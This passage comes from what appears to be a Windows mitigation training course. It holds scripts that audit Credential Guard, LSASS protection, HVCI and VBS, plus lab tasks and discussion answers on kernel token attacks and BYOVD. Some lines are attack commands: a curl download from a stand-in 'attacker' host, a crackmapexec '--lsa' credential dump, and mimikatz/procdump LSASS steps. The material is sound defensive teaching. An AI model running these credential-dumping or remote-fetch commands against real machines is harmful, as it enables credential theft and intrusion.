reconnaissance to determine if mimikatz-style attacks will work.

For local testing, it probes LSASS protection status.

Usage:
  # Local check
  python cred_guard_verifier.py

  # Remote check (requires credentials)
  python cred_guard_verifier.py --target 192.168.1.100 --user admin --pass P@ssw0rd
"""
import subprocess
import sys
import os
import argparse

def local_check():
    """Check Credential Guard status on the local machine."""
    print("\n" + "=" * 60)
    print("  Local Credential Guard Analysis")
    print("=" * 60)

    checks = [
        {
            "name": "Credential Guard Registry",
            "cmd": (
                "try { $v = (Get-ItemProperty "
                "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' "
                "-Name LsaCfgFlags -EA Stop).LsaCfgFlags; "
                "if ($v -ge 1) { 'ENABLED' } else { 'DISABLED' } "
                "} catch { 'NOT_CONFIGURED' }"
            ),
        },
        {
            "name": "LSASS Protection (RunAsPPL)",
            "cmd": (
                "try { $v = (Get-ItemProperty "
                "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' "
                "-Name RunAsPPL -EA Stop).RunAsPPL; "
                "if ($v -ge 1) { 'ENABLED (value=' + $v + ')' } else { 'DISABLED' } "
                "} catch { 'NOT_CONFIGURED' }"
            ),
        },
        {
            "name": "VBS Security Services",
            "cmd": (
                "(Get-CimInstance -ClassName Win32_DeviceGuard "
                "-Namespace root/Microsoft/Windows/DeviceGuard)."
                "SecurityServicesRunning -join ','"
            ),
        },
        {
            "name": "LSASS Process Protection",
            "cmd": (
                "$lsass = Get-Process lsass -EA SilentlyContinue; "
                "if ($lsass) { "
                "'PID=' + $lsass.Id + ' Handles=' + $lsass.HandleCount "
                "} else { 'Cannot access LSASS (good — it is protected)' }"
            ),
        },
        {
            "name": "WDigest Credential Caching",
            "cmd": (
                "try { $v = (Get-ItemProperty "
                "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' "
                "-Name UseLogonCredential -EA Stop).UseLogonCredential; "
                "if ($v -eq 1) { 'ENABLED (cleartext creds in memory!)' } "
                "else { 'DISABLED (good)' } "
                "} catch { 'NOT_SET (default: disabled on Win10+)' }"
            ),
        },
    ]

    results = []
    for check in checks:
        try:
            result = subprocess.run(
                ["powershell", "-NoProfile", "-Command", check["cmd"]],
                capture_output=True, text=True, timeout=15
            )
            output = result.stdout.strip()
        except Exception as e:
            output = f"Error: {e}"

        # Better icon logic
        if "Credential Guard" in check["name"]:
            icon = "+" if "ENABLED" in output else "-"
        elif "RunAsPPL" in check["name"]:
            icon = "+" if "ENABLED" in output else "-"
        elif "Cannot access" in output or "DISABLED (good)" in output or "NOT_SET (default" in output:
            icon = "+"
        else:
            icon = "?"

        print(f"  [{icon}] {check['name']}: {output}")
        results.append((check["name"], output))

    # Exploitation impact summary
    print("\n  Credential Extraction Impact:")
    print("  " + "-" * 50)

    # Check if Credential Guard is ACTUALLY running (not just configured)
    vbs_services = next((r[1] for r in results if "VBS Security Services" in r[0]), "")
    cg_running = "1" in vbs_services.split(",")
    ppl_enabled = any("ENABLED" in r[1] for r in results if "RunAsPPL" in r[0])

    print(f"\n  Analysis:")
    print(f"    Credential Guard actually running: {'YES' if cg_running else 'NO'}")
    print(f"    LSASS RunAsPPL protection: {'YES' if ppl_enabled else 'NO'}")
    print(f"    VBS Services active: {vbs_services}")
    print()

    attacks = [
        ("mimikatz sekurlsa::logonpasswords",
         "BLOCKED" if cg_running else "VIABLE (CG not running)" if ppl_enabled else "VIABLE"),
        ("mimikatz sekurlsa::wdigest",
         "BLOCKED" if cg_running else "VIABLE"),
        ("LSASS process dump (comsvcs.dll)",
         "BLOCKED" if ppl_enabled else "VIABLE"),
        ("LSASS memory read (procdump)",
         "BLOCKED" if ppl_enabled else "VIABLE"),
        ("Kerberos ticket extraction",
         "BLOCKED" if cg_running else "VIABLE"),
        ("Pass-the-Hash",
         "BLOCKED" if cg_running else "VIABLE"),
        ("Kerberos delegation abuse",
         "VIABLE (not blocked by CG)"),
        ("Token impersonation",
         "VIABLE (not blocked by CG)"),
    ]

    for attack, status in attacks:
        icon = "-" if "BLOCKED" in status else "+"
        print(f"    [{icon}] {attack}: {status}")

def remote_check(target, username, password):
    """Check Credential Guard on a remote host via WinRM."""
    print(f"\n  Remote check for {target} (via WinRM)...")
    print("  [*] Using Invoke-Command over WinRM")

    ps_script = (
        f"$cred = New-Object PSCredential("
        f"'{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force)); "
        f"Invoke-Command -ComputerName {target} -Credential $cred -ScriptBlock {{ "
        f"(Get-CimInstance -ClassName Win32_DeviceGuard "
        f"-Namespace root/Microsoft/Windows/DeviceGuard)."
        f"SecurityServicesRunning -join ',' }}"
    )

    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command", ps_script],
            capture_output=True, text=True, timeout=30
        )
        output = result.stdout.strip()
        if "1" in output:
            print(f"  [+] Credential Guard is RUNNING on {target}")
        elif "2" in output:
            print(f"  [+] HVCI is RUNNING on {target}")
        else:
            print(f"  [-] Security services on {target}: {output or 'none detected'}")
    except Exception as e:
        print(f"  [!] Remote check failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="Credential Guard Verifier")
    parser.add_argument("--target", help="Remote target IP/hostname")
    parser.add_argument("--user", help="Username for remote check")
    parser.add_argument("--pass", dest="password", help="Password for remote check")
    args = parser.parse_args()

    print("=" * 60)
    print("  Credential Guard Verification Tool")
    print("=" * 60)

    if os.name != "nt":
        print("\n  [!] Run this script on Windows for live checks.")
        print("  [*] For remote probing from Linux, use:")
        print("      crackmapexec smb <target> -u user -p pass --lsa")
        print("      (will fail if Credential Guard is active)")
        print("\n  Expected Credential Guard behavior:")
        print("    CG ON:  mimikatz -> NTLM: (null)")
        print("    CG OFF: mimikatz -> NTLM: 5f4dcc3b5aa765d61d8327deb882cf99")
        return

    local_check()

    if args.target and args.user and args.password:
        remote_check(args.target, args.user, args.password)

if __name__ == "__main__":
    main()
```

#### VBS Mitigation Validation Suite

```python
#!/usr/bin/env python3
"""
vbs_validation_suite.py — Complete VBS/HVCI mitigation validation
Demonstrates: End-to-end testing of all Day 5 mitigations.

Runs all checks from Day 5 in a single script:
  1. VBS status and configuration
  2. HVCI enforcement verification
  3. Credential Guard status
  4. SMEP/SMAP/KPTI detection
  5. Speculation control mitigations
  6. Kernel CFG (kCFG) status
  7. Secure Boot verification
  8. WDAC/CI policy status
  9. Vulnerable driver blocklist
  10. Attack surface assessment

Generates a JSON report for comparison across different configurations.

Usage: python vbs_validation_suite.py [--output report.json]
"""
import subprocess
import json
import os
import sys
import datetime
import argparse

def ps(command):
    """Run PowerShell command, return stdout."""
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-Command", command],
            capture_output=True, text=True, timeout=30
        )
        return r.stdout.strip()
    except Exception as e:
        return f"ERROR: {e}"

def check(name, command, interpret_fn=None):
    """Run a check and return structured result."""
    output = ps(command)
    if interpret_fn:
        status, detail = interpret_fn(output)
    else:
        status = "info"
        detail = output
    return {"name": name, "status": status, "output": output, "detail": detail}

def interpret_bool(output):
    if output.lower() in ("true", "1", "enabled", "running"):
        return "enabled", output
    elif output.lower() in ("false", "0", "disabled"):
        return "disabled", output
    return "unknown", output

def run_all_checks():
    """Run comprehensive VBS/HVCI mitigation checks."""
    results = []

    print("[*] Running VBS/HVCI Mitigation Validation Suite...\n")

    # 1. VBS Status
    print("  [1/10] VBS Status...")
    r = check("VBS Status",
        "(Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root/Microsoft/Windows/DeviceGuard)."
        "VirtualizationBasedSecurityStatus",
        lambda o: ("enabled" if o == "2" else "disabled",
                   {"0":"Off","1":"Configured","2":"Running"}.get(o, o)))
    results.append(r)
    print(f"    -> {r['detail']}")

    # 2. HVCI
    print("  [2/10] HVCI (Memory Integrity)...")
    r = check("HVCI",
        "try { (Get-ItemProperty "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard"
        "\\Scenarios\\HypervisorEnforcedCodeIntegrity' "
        "-Name Enabled -EA Stop).Enabled } catch { 'NOT_SET' }",
        interpret_bool)
    results.append(r)
    print(f"    -> {r['detail']}")

    # 3. Credential Guard (check both registry AND actual running status)
    print("  [3/10] Credential Guard...")
    # First check registry
    reg_output = ps(
        "try { (Get-ItemProperty "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' "
        "-Name LsaCfgFlags -EA Stop).LsaCfgFlags } catch { '0' }")
    # Then check if actually running
    running_output = ps(
        "(Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root/Microsoft/Windows/DeviceGuard)."
        "SecurityServicesRunning -contains 1")

    is_running = running_output.lower() == "true"
    reg_status = {"0":"Disabled","1":"UEFI Lock","2":"No Lock"}.get(reg_output, reg_output)

    if is_running:
        status = "enabled"
        detail = f"{reg_status} (Running)"
    elif reg_output in ("1", "2"):
        status = "disabled"
        detail = f"{reg_status} (Configured but NOT running - requires Enterprise/Education)"
    else:
        status = "disabled"
        detail = "Disabled"

    results.append({"name": "Credential Guard", "status": status,
                   "output": f"Registry:{reg_output}, Running:{running_output}",
                   "detail": detail})
    print(f"    -> {detail}")

    # 4. Secure Boot
    print("  [4/10] Secure Boot...")
    r = check("Secure Boot",
        "try { Confirm-SecureBootUEFI } catch { 'ERROR' }",
        interpret_bool)
    results.append(r)
    print(f"    -> {r['detail']}")

    # 5. LSASS Protection (RunAsPPL)
    print("  [5/10] LSASS RunAsPPL...")
    r = check("LSASS RunAsPPL",
        "try { (Get-ItemProperty "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' "
        "-Name RunAsPPL -EA Stop).RunAsPPL } catch { '0' }",
        lambda o: ("enabled" if o in ("1", "2") else "disabled",
                   {"0":"Disabled","1":"Enabled","2":"Enabled (UEFI)"}.get(o, o)))
    results.append(r)
    print(f"    -> {r['detail']}")

    # 6. Kernel DMA Protection
    print("  [6/10] Kernel DMA Protection...")
    r = check("Kernel DMA Protection",
        "(Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root/Microsoft/Windows/DeviceGuard)."
        "AvailableSecurityProperties -contains 7",
        interpret_bool)
    results.append(r)
    print(f"    -> {r['detail']}")

    # 7. Code Integrity Policy
    print("  [7/10] Code Integrity Policy...")
    r = check("CI Policy",
        "(Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root/Microsoft/Windows/DeviceGuard)."
        "CodeIntegrityPolicyEnforcementStatus",
        lambda o: ("enabled" if o == "2" else "disabled" if o == "0" else "audit",
                   {"0":"Off","1":"Audit","2":"Enforced"}.get(o, o)))
    results.append(r)
    print(f"    -> {r['detail']}")

    # 8. Vulnerable Driver Blocklist
    print("  [8/10] Vulnerable Driver Blocklist...")
    r = check("Driver Blocklist",
        "try { (Get-ItemProperty "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config' "
        "-Name VulnerableDriverBlocklistEnable -EA Stop)."
        "VulnerableDriverBlocklistEnable } catch { 'NOT_SET' }",
        lambda o: ("enabled" if o == "1" else "disabled" if o == "0" else "unknown", o))
    results.append(r)
    print(f"    -> {r['detail']}")

    # 9. WDigest (cleartext creds)
    print("  [9/10] WDigest Cleartext Caching...")
    r = check("WDigest",
        "try { (Get-ItemProperty "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' "
        "-Name UseLogonCredential -EA Stop).UseLogonCredential } "
        "catch { 'NOT_SET' }",
        lambda o: ("disabled" if o in ("0", "NOT_SET") else "enabled",
                   "Disabled (secure)" if o in ("0", "NOT_SET") else "Enabled (INSECURE!)"))
    results.append(r)
    print(f"    -> {r['detail']}")

    # 10. DEP System Policy
    print("  [10/10] System DEP Policy...")
    r = check("DEP Policy",
        "(Get-CimInstance Win32_OperatingSystem)."
        "DataExecutionPrevention_SupportPolicy",
        lambda o: ("enabled" if o in ("1","3") else "partial" if o == "2" else "disabled",
                   {"0":"Always Off","1":"Always On","2":"Opt-In","3":"Opt-Out"}.get(o,o)))
    results.append(r)
    print(f"    -> {r['detail']}")

    return results

def generate_report(results, output_file=None):
    """Generate attack surface assessment and optional JSON report."""
    print("\n" + "=" * 60)
    print("  MITIGATION VALIDATION REPORT")
    print("=" * 60)

    enabled = sum(1 for r in results if r["status"] == "enabled")
    disabled = sum(1 for r in results if r["status"] == "disabled")
    total = len(results)

    print(f"\n  Score: {enabled}/{total} mitigations enabled")
    print(f"  {'='*40}")

    for r in results:
        icon = {"enabled":"+", "disabled":"-", "audit":"~"}.get(r["status"], "?")
        print(f"  [{icon}] {r['name']:<30} {r['detail']}")

    # Attack surface assessment
    print(f"\n  Attack Surface Assessment:")
    print(f"  {'-'*40}")

    status_map = {r["name"]: r["status"] for r in results}

    attacks = [
        ("Kernel shellcode injection",
         status_map.get("HVCI") == "enabled",
         "HVCI"),
        ("Unsigned driver loading",
         status_map.get("HVCI") == "enabled",
         "HVCI"),
        ("LSASS credential dumping (mimikatz)",
         status_map.get("Credential Guard") == "enabled" or
         status_map.get("LSASS RunAsPPL") == "enabled",
         "CG/PPL"),
        ("Pass-the-Hash attacks",
         status_map.get("Credential Guard") == "enabled",
         "CG"),
        ("WDigest cleartext password theft",
         status_map.get("WDigest") == "disabled",
         "WDigest disabled"),
        ("DMA attacks (Thunderbolt/PCILeech)",
         status_map.get("Kernel DMA Protection") == "enabled",
         "DMA Prot"),
        ("BYOVD (signed vuln drivers)",
         status_map.get("Driver Blocklist") == "enabled",
         "Blocklist (partial)"),
        ("Firmware/bootkit attacks",
         status_map.get("Secure Boot") == "enabled",
         "Secure Boot"),
        ("Data-only kernel attacks (token swap)",
         False,  # No current mitigation fully prevents this
         "None (KDP partial)"),
    ]

    for attack, blocked, mitigation in attacks:
        icon = "X" if blocked else "!"
        status = "BLOCKED" if blocked else "VIABLE"
        print(f"  [{icon}] {attack:<35} {status:<10} [{mitigation}]")

    # Save report
    if output_file:
        report = {
            "timestamp": datetime.datetime.now().isoformat(),
            "hostname": os.environ.get("COMPUTERNAME", "unknown"),
            "score": f"{enabled}/{total}",
            "results": results,
        }
        with open(output_file, "w") as f:
            json.dump(report, f, indent=2)
        print(f"\n  [*] Report saved to: {output_file}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", "-o", help="Output JSON report file")
    args = parser.parse_args()

    print("=" * 60)
    print("  VBS/HVCI Mitigation Validation Suite")
    print(f"  Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}")
    print("=" * 60)

    if os.name != "nt":
        print("\n  [!] This script must be run on Windows.")
        print("  [*] Transfer to target: python -m http.server 8080")
        print("  [*] On target: curl http://attacker:8080/vbs_validation_suite.py -o v.py")
        print("  [*] Run: python v.py --output report.json")
        return

    results = run_all_checks()
    generate_report(results, args.output)

if __name__ == "__main__":
    main()
```

#### Task 1: Enable VBS and HVCI

1. Check current VBS status with `Get-CimInstance Win32_DeviceGuard`
2. Enable HVCI via Windows Settings (Settings → Privacy & Security → Windows Security → Device Security → Core Isolation → Memory Integrity)
3. Reboot and verify HVCI is running (check SecurityServicesRunning contains 2)
4. Document the security services enabled

**Note**: VBS is automatically enabled when HVCI is turned on. You don't need to enable VBS separately.

#### Task 2: Credential Guard Testing

**IMPORTANT**: This task requires Windows Enterprise or Education edition. Windows Pro/Home do not support Credential Guard.

1. Check your Windows edition: `Get-ComputerInfo | Select-Object WindowsEditionId`
2. If Enterprise/Education: Enable Credential Guard via Group Policy
3. Verify it's actually running: Check if SecurityServicesRunning contains 1
4. Run Mimikatz `sekurlsa::logonpasswords` - document failure
5. Compare output with Credential Guard disabled
6. Explain why hashes are inaccessible (isolated in VTL 1)

**Alternative for Windows Pro**: Test LSASS RunAsPPL protection instead:

- Enable RunAsPPL in registry
- Attempt LSASS memory dump with procdump
- Document how RunAsPPL blocks the dump

#### Task 3: HVCI Driver Blocking Test

> [!NOTE]
> Building actual kernel drivers requires the Windows Driver Kit (WDK) and
> code signing certificates. Instead of compiling a driver, we test HVCI
> by attempting to load a known unsigned `.sys` file.

```powershell
# Step 1: Create a dummy "driver" file (just garbage bytes — not a real driver)
# This simulates having an unsigned .sys file
fsutil file createnew C:\Windows_Mitigations_Lab\bin\fake_unsigned.sys 4096

# Step 2: Attempt to register it as a kernel service
sc create FakeDriver type= kernel binPath= C:\Windows_Mitigations_Lab\bin\fake_unsigned.sys

# Step 3: Try to start it
sc start FakeDriver
# Without HVCI: Fails (not a valid PE) — but the LOADING attempt is allowed
# With HVCI:    Fails EARLIER — HVCI rejects unsigned code before parsing

# Step 4: Check Event Log for HVCI block
Get-WinEvent -LogName "Microsoft-Windows-CodeIntegrity/Operational" -MaxEvents 10 |
    Where-Object { $_.Id -in @(3089, 3077) } |
    Select-Object TimeCreated, Id, Message
# Event ID 3089: Signing information for blocked file
# Event ID 3077: Code integrity enforcement block

# Step 5: Verify HVCI is actually enforcing
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object CodeIntegrityPolicyEnforcementStatus
# 2 = Enforced (HVCI active)
# 1 = Audit mode
# 0 = Off

# Step 6: Clean up
sc delete FakeDriver

# Real-world BYOVD test:
# A SIGNED but VULNERABLE driver (e.g., Capcom.sys, DBUtil_2_3.sys)
# will PASS HVCI signature checks and load successfully.
# This is the BYOVD attack vector — HVCI checks integrity, not quality.
# However, the Vulnerable Driver Blocklist (if enabled) blocks known bad drivers.
```

#### Task 4: Kernel Token Attack Simulation

```python
#!/usr/bin/env python3
# vbs_token_test.py - Demonstrates VBS/KDP protection concept
# Educational: Shows what kernel exploits try to do

import ctypes
import struct

def explain_token_attack():
    """Explain what kernel token attacks try to achieve"""
    print("=" * 60)
    print("Kernel Token Manipulation Attack (Educational)")
    print("=" * 60)

    print("""
Without VBS/HVCI:
1. Exploit kernel vulnerability to get read/write primitive
2. Find current process EPROCESS structure
3. Locate Token pointer in EPROCESS
4. Copy SYSTEM process token to current process
5. Result: Current process now has SYSTEM privileges

With VBS/HVCI enabled (but WITHOUT KDP on Token):
1. Same kernel vulnerability exploited
2. Same read/write primitive achieved
3. Attempt to modify Token pointer
4. Modification SUCCEEDS - Token is NOT KDP-protected!
5. Exploit SUCCEEDS - privilege escalation works
6. This is why CVE-2024-21338 worked even with VBS+HVCI!

With VBS/HVCI + KDP on Token (future/theoretical):
1. Same kernel vulnerability exploited
2. Same read/write primitive achieved
3. Attempt to modify Token pointer
4. KDP BLOCKS modification - Token is in protected memory
5. Exploit FAILS - cannot escalate privileges

CRITICAL REALITY:
- HVCI protects CODE integrity (blocks unsigned kernel code)
- HVCI does NOT protect DATA integrity (allows token modification)
- EPROCESS.Token is NOT KDP-protected in current Windows versions
- KDP is opt-in and rarely used for critical structures

Protected Structures (KDP - when drivers opt in):
- Driver-specific data sections (via MmProtectDriverSection)
- NOT automatically: EPROCESS.Token, EPROCESS.SecurityDescriptor
- This is the gap that data-only attacks exploit!
""")

    # Simulate checking if protection would work
    print("\n[*] Simulating protection check...")
    print("[+] If HVCI enabled: Kernel shellcode BLOCKED")
    print("[!] If HVCI enabled: Token modification STILL WORKS (data-only attack)")
    print("[+] If KDP on Token (future): Token modification BLOCKED")
    print("[-] If VBS disabled: Both shellcode AND token attacks work")

if __name__ == "__main__":
    explain_token_attack()
```

### Key Takeaways

1. **VBS creates a hardware-enforced trust boundary**: Even a compromised kernel (VTL 0)
   cannot access Secure World (VTL 1) memory. This is fundamentally different from all
   software-only mitigations we studied in Days 2-4.
2. **HVCI is "code signing for the kernel"**: It prevents unsigned code execution but does
   NOT prevent data corruption. CVE-2024-21338 proved that data-only attacks (token swap)
   work even with HVCI enabled — the same principle as Day 2's data-only technique.
3. **Credential Guard eliminates pass-the-hash**: Credentials stored in VTL 1 are
   inaccessible even to SYSTEM-level attackers. This forces attackers to use Kerberos
   relay/delegation attacks instead of simple credential dumping.
4. **KDP is opt-in, not automatic**: A common misconception is that KDP protects all
   kernel structures. In reality, only data explicitly registered via
   `MmProtectDriverSection()` is protected. EPROCESS.Token is NOT KDP-protected.
5. **BYOVD (Bring Your Own Vulnerable Driver) bypasses HVCI**: Signed drivers with
   known vulnerabilities pass HVCI checks. Microsoft maintains a blocklist, but
   it's always reactive — new vulnerable signed drivers appear regularly.
6. **SMEP/SMAP eliminated classic kernel exploitation**: Pre-2012 kernel exploits could
   execute user-mode shellcode from ring 0. SMEP blocks this entirely. SMAP prevents
   the kernel from reading attacker-controlled user-mode memory.
7. **KVA Shadow (Meltdown mitigation) has real performance cost**: 2-5% with PCID,
   up to 30% without. I/O-intensive workloads are most affected.
8. **Speculation attacks are mitigated, not eliminated**: Retpoline, IBRS, and STIBP
   mitigate known Spectre variants, but new speculation primitives continue to be
   discovered. Hardware fixes in newer CPUs provide better performance than software
   mitigations.
9. **The exploit evolution is clear**: Memory corruption -> ROP -> Data-only -> Logic bugs
   -> Signed driver abuse. Each mitigation layer forced attackers to the next technique.

### Discussion Questions

1. **Can a hypervisor vulnerability compromise VBS?**

   > Yes. If Hyper-V itself has a vulnerability, VTL 1 can be compromised. Hyper-V
   > bugs are rare but extremely high-value (Project Zero has found some). This is
   > why Microsoft runs a dedicated Hyper-V bug bounty with payouts up to $250K.

2. **What attacks remain possible even with VBS+HVCI?**

   > Data-only attacks (token swap if KDP not covering it), logic bugs in signed
   > drivers, BYOVD, supply chain compromise of signed code, firmware/UEFI attacks
   > below VBS, and DMA attacks from PCIe devices without Kernel DMA Protection.

3. **How does VBS affect compatibility with older drivers?**

   > Unsigned drivers cannot load at all. Signed drivers using non-compliant memory
   > operations (W+X pages, modifying read-only sections) will crash. This breaks
   > many older antivirus products, hardware drivers, and virtualization software.
   > Check compatibility with `Get-SystemDriver | Where { !$_.HVCICompliant }`.

4. **Is VBS the future of OS security, or a temporary solution?**

   > VBS is a bridge technology. Long-term, languages like Rust eliminate memory
   > corruption at compile time. But VBS protects existing C/C++ codebases that
   > cannot be rewritten. Expect VBS to remain critical for the next 10+ years.

5. **Why can't "Administrator" access VTL 1 (Secure World) memory?**

   > Administrator runs in VTL 0 (Normal World). The hypervisor (ring -1) enforces
   > VTL isolation using Second Level Address Translation (SLAT/EPT). Even the NT
   > kernel cannot construct page tables that map VTL 1 memory — the hypervisor
   > intercepts and blocks such attempts at the hardware level.

6. **How does Pluton differ from a traditional TPM 2.0 chip?**

   > Traditional TPMs are discrete chips connected via LPC/SPI bus — an attacker
   > with physical access can sniff the bus ("bus interposer" attack). Pluton is
   > integrated INTO the CPU die, eliminating the physical bus attack surface.
   > Pluton also receives firmware updates via Windows Update, unlike TPMs which
   > rarely receive firmware patches.

7. **If HVCI blocks unsigned drivers, how do "BYOVD" attacks still work?**

   > BYOVD uses drivers that ARE legitimately signed (by Microsoft or WHQL). The
   > driver has a known vulnerability (e.g., arbitrary kernel read/write via IOCTL).
   > HVCI validates the signature (valid!) but cannot assess code quality. The
   > attacker exploits the signed driver's vulnerability to achieve kernel access.
   > Microsoft's Vulnerable Driver Blocklist mitigates this reactively.

8. **Why does Credential Guard require UEFI Secure Boot to be effective?**

   > Without Secure Boot, an attacker could install a bootkit that loads before the
   > hypervisor and either disables VBS entirely or intercepts credentials before
   > they reach VTL 1. Secure Boot ensures the boot chain is trusted from firmware
   > to hypervisor to secure kernel. BlackLotus (CVE-2022-21894) demonstrated what
   > happens when Secure Boot is bypassed.

9. **What types of kernel attacks remain viable even with VBS enabled?**
   > Data-only attacks (overwrite non-KDP-protected data like tokens, file paths,
   > security descriptors), logic bugs in signed drivers (TOCTOU, type confusion),
   > BYOVD with signed-but-vulnerable drivers, and attacks targeting the hypervisor
   > itself. The key insight from this entire week: as code-flow protections improve,
   > attackers pivot to data-flow attacks.

## Day 6: Comprehensive Mitigation Testing and Validation

- **Estimated Time**: 4-5 hours
- **Goal**: Systematically test all mitigations and document security posture.
- **Activities**:
  - _Reading_:
    - [Exploit Protection Reference](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/exploit-protection-reference)
  - _Online Resources_:
    - [Windows Security Baselines](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/windows-security-baselines)
  - _Tool Setup_:
    - Security Compliance Toolkit
    - BinSkim Binary Analyzer (replaces deprecated BinScope)
  - _Exercise_:
    - Audit system mitigation status
    - Test each protection mechanism
    - Build comprehensive security report

### Deliverables

- **Audit Report**: `mitigation_audit.csv` from your test directory
- **Compliance Check**: `compliance_report.json` showing system hardening status
- **Drift/Match**: A screenshot showing your test binary PASSING the build gate

### Mitigation Audit

**Automated Audit Script**:

```bash
# mitigation_audit.ps1
Write-Host "=== Windows Mitigation Audit ===" -ForegroundColor Cyan

# 1. Check DEP
Write-Host "`n[*] Checking DEP..." -ForegroundColor Yellow
$dep = Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -ExpandProperty DataExecutionPrevention_SupportPolicy
switch ($dep) {
    0 { Write-Host "[-] DEP: Always Off" -ForegroundColor Red }
    1 { Write-Host "[+] DEP: Always On" -ForegroundColor Green }
    2 { Write-Host "[~] DEP: Opt-In (default)" -ForegroundColor Yellow }
    3 { Write-Host "[+] DEP: Opt-Out" -ForegroundColor Green }
}

# 2. Check ASLR
Write-Host "`n[*] Checking ASLR..." -ForegroundColor Yellow
$aslr = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "MoveImages" -ErrorAction SilentlyContinue
if ($aslr.MoveImages -eq 0) {
    Write-Host "[-] ASLR: Disabled" -ForegroundColor Red
} else {
    Write-Host "[+] ASLR: Enabled" -ForegroundColor Green
}

# 3. Check SEHOP
Write-Host "`n[*] Checking SEHOP..." -ForegroundColor Yellow
$sehop = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DisableExceptionChainValidation" -ErrorAction SilentlyContinue
if ($sehop.DisableExceptionChainValidation -eq 1) {
    Write-Host "[-] SEHOP: Disabled" -ForegroundColor Red
} else {
    Write-Host "[+] SEHOP: Enabled" -ForegroundColor Green
}

# 4. Check VBS
Write-Host "`n[*] Checking VBS..." -ForegroundColor Yellow
$vbs = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
if ($vbs.VirtualizationBasedSecurityStatus -eq 2) {
    Write-Host "[+] VBS: Running" -ForegroundColor Green

    $services = $vbs.SecurityServicesRunning
    if ($services -contains 1) {
        Write-Host "  [+] Credential Guard: Running" -ForegroundColor Green
    }
    if ($services -contains 2) {
        Write-Host "  [+] HVCI: Running" -ForegroundColor Green
    }
} else {
    Write-Host "[-] VBS: Not Running" -ForegroundColor Red
}

# 5. Check CFG
Write-Host "`n[*] Checking CFG support..." -ForegroundColor Yellow
# CFG is per-process, check common system binaries
$testBinaries = @(
    "C:\Windows\System32\notepad.exe",
    "C:\Windows\System32\cmd.exe",
    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
)

foreach ($bin in $testBinaries) {
    if (Test-Path $bin) {
        try {
            # Use Get-ProcessMitigation to check CFG for the binary
            $mitigation = Get-ProcessMitigation -Name ([System.IO.Path]::GetFileName($bin)) -ErrorAction SilentlyContinue

            if ($mitigation -and $mitigation.CFG.Enable -in @("ON", $true)) {
                Write-Host "  [+] $([System.IO.Path]::GetFileName($bin)) has CFG enabled" -ForegroundColor Green
            } else {
                # Fallback: Check PE headers directly
                $bytes = [System.IO.File]::ReadAllBytes($bin)
                $peOffset = [BitConverter]::ToInt32($bytes, 0x3C)
                $machine = [BitConverter]::ToUInt16($bytes, $peOffset + 4)

                # DllCharacteristics location
                if ($machine -eq 0x8664) {  # x64
                    $dllCharOffset = $peOffset + 0x46 + 0x18
                } else {  # x86
                    $dllCharOffset = $peOffset + 0x46
                }

                $dllChar = [BitConverter]::ToUInt16($bytes, $dllCharOffset)
                $cfgFlag = 0x4000  # IMAGE_DLLCHARACTERISTICS_GUARD_CF

                if (($dllChar -band $cfgFlag) -eq $cfgFlag) {
                    Write-Host "  [+] $([System.IO.Path]::GetFileName($bin)) has CFG in PE header" -ForegroundColor Green
                } else {
                    Write-Host "  [-] $([System.IO.Path]::GetFileName($bin)) lacks CFG" -ForegroundColor Yellow
                }
            }
        } catch {
            Write-Host "  [~] Could not check $([System.IO.Path]::GetFileName($bin))" -ForegroundColor Gray
        }
    }
}

Write-Host "`n  Note: CFG is enabled per-process. System-wide default:" -ForegroundColor Gray
try {
    $sysCFG = (Get-ProcessMitigation -System).CFG.Enable
    if ($sysCFG -in @("ON", $true)) {
        Write-Host "    [+] System-wide CFG: Enabled by default" -ForegroundColor Green
    } else {
        Write-Host "    [-] System-wide CFG: Not enabled by default" -ForegroundColor Yellow
    }
} catch {
    Write-Host "    [~] Could not query system CFG policy" -ForegroundColor Gray
}

# 6. Check CET (Control-flow Enforcement Technology)
Write-Host "`n[*] Checking CET..." -ForegroundColor Yellow
$cpu = Get-CimInstance -ClassName Win32_Processor | Select-Object -First 1

# Check for CET-capable CPU (11th gen Intel Tiger Lake+, AMD Zen 3+)
$cetCapableCPU = $false
if ($cpu.Name -match "11th Gen|12th Gen|13th Gen|14th Gen|Core Ultra" -or
    $cpu.Name -match "Ryzen.*(5[0-9]{3}|7[0-9]{3}|9[0-9]{3})" -or
    $cpu.Name -match "EPYC.*7[0-9]{3}") {
    $cetCapableCPU = $true
}

if ($cetCapableCPU) {
    Write-Host "[+] CET: CPU is CET-capable ($($cpu.Name))" -ForegroundColor Green

    # Check if Shadow Stack is enabled at system level
    try {
        $mitigation = Get-ProcessMitigation -System
        $shadowStack = $mitigation.UserShadowStack
        $shadowStackValue = $shadowStack.Enable

        Write-Host "  Debug: UserShadowStack.Enable = '$shadowStackValue'" -ForegroundColor Gray

